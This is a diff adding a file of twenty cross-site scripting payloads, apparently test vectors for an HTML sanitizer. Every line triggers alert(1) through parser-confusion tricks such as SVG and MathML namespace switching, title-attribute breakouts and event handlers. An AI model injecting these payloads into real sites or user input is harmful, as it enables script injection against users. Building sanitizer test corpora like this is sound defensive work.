@@ -1,0 +1,20 @@
+<math><mtext></table><img src=x onerror=alert(1)>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]>
+<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(1)>">
+<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></div></foreignObject></svg>
+<xmp><p title="</xmp><img src=x onerror=alert(1)>">
+<template id=x><script>alert(1)</script></template><script>document.body.appendChild(document.getElementById('x').content)</script>
+<iframe srcdoc="&lt;script&gt;top.alert(1)&lt;/script&gt;">
+<script>with(window)alert(1)</script>
+<svg><set attributeName=onload to=alert(1)>
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+<script>Object.defineProperty(window,"x",{get:function(){alert(1)}});x</script>
+<frameset onload=alert(1)>
+<input name=attributes><form><button formaction=javascript:alert(1)>
+<script>({get x(){alert(1)}}).x</script>
+<script>Function.prototype.call.call(alert,window,1)</script>
+<script>Proxy&&new Proxy({},{get(){alert(1)}})+''</script>
+<style>@keyframes x{}</style><p style="animation:x 1s" onanimationstart=alert(1)>
+<details open ontoggle=alert(1) id=x><summary>x</summary></details>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)<\/script></svg>#x"/>
